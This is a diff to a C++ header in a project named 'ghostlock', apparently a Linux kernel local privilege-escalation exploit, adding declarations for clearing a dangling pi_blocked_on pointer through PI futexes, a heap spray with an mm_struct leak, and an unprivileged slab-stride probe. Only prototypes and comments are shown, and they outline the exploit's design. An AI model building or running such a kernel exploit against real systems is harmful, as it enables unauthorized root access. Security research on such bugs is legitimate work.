@@ -30,6 +30,11 @@ namespace ghostlock::support {
         uint32_t *uaddr, int32_t op, uint32_t val,
         const void *timeout_or_value, uint32_t *uaddr2, uint32_t val3);
 
+    /* Force the kernel to clear this thread's dangling task->pi_blocked_on.
+     * Only the blocking PI-futex path rewrites the field (ETIMEDOUT clears
+     * it), and it must run on the thread that owns the pointer. */
+    long ghost_disarm(const char *why, int32_t *err_out);
+
     long sched_setattr_tid(int32_t tid, int32_t nice_value);
 
     void put64(unsigned char *p, size_t off, uint64_t value);
@@ -64,9 +69,19 @@ namespace ghostlock::support {
 
     int32_t prepare_skb_payload(uintptr_t base, const ghostlock::memory::WriteRequest *request);
 
-    uintptr_t prepare_kernel_page(const ghostlock::memory::WriteRequest *request);
+    /* leak_only: run the spray and the mm_struct leak, then tear the spray
+     * down without preparing a payload page. Used by the profile-generation
+     * stride probe; the attack path always calls the default form. */
+    uintptr_t prepare_kernel_page(const ghostlock::memory::WriteRequest *request,
+                                  bool leak_only = false);
 
     uintptr_t prepare_good_kernel_page(const ghostlock::memory::WriteRequest &request);
+
+    /* Run up to max_rounds unprivileged leak rounds for the slab-stride
+     * verifier and print its evidence table ([stride] lines). Returns whether
+     * one candidate held every nonzero vote. The caller must have installed the
+     * profile and initialized the runtime configuration. */
+    bool probe_mm_stride(std::size_t sizeof_mm, std::size_t max_rounds);
 } // namespace ghostlock::support
 
 #endif
